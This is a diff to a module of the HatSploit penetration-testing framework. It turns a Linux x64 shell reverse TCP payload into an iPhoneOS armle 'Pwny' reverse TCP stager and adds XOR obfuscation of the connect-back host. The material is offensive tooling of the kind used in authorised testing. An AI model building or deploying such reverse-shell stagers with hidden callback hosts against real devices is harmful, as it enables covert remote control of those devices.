@@ -7,27 +7,29 @@
 
 from hatsploit.lib.payload import Payload
 from hatsploit.lib.config import Config
+
+from hatsploit.utils.string import StringTools
 from hatsploit.utils.tcp import TCPClient
 
 from hatsploit.external.pwny.session import HatSploitSession
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, StringTools):
     config = Config()
 
     details = {
         'Category': "stager",
-        'Name': "Linux x64 Shell Reverse TCP",
-        'Payload': "linux/x64/shell_reverse_tcp",
+        'Name': "iPhoneOS armle Pwny Reverse TCP",
+        'Payload': "iphoneos/armle/pwny_reverse_tcp",
         'Authors': [
             'Ivan Nikolsky (enty8080) - payload developer'
         ],
-        'Description': "Shell reverse TCP payload for Linux x64.",
+        'Description': "Pwny reverse TCP payload for iPhoneOS armle.",
         'Comments': [
             ''
         ],
-        'Architecture': "x64",
-        'Platform': "linux",
+        'Architecture': "armle",
+        'Platform': "iphoneos",
         'Rank': "high",
         'Type': "reverse_tcp"
     }
@@ -57,8 +59,8 @@ class HatSploitPayload(Payload):
 
         self.payload.update({
             'Args': self.payload['Args'].format(
-                connback_host,
-                connback_host
+                self.xor_string(connback_host),
+                self.xor_string(connback_host)
             )
         })
 
